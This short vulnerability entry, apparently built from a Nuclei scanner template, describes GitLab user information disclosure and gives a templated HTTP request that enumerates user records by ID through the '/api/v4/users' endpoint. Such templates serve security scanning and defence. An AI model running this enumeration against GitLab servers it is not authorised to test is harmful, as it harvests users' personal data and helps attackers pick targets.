# Vulnerability: GitLab - User Information Disclosure Via Open API
**Classification:** GITLAB
**Source:** Nuclei Template (`gitlab-api-user-enum.yaml`)

## Description
GitLab - User Information is exposed Via Open API.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /api/v4/users/{{uid}} HTTP/1.1
Host: {{Hostname}}
Accept: application/json, text/plain, */*
Referer: {{BaseURL}}
```

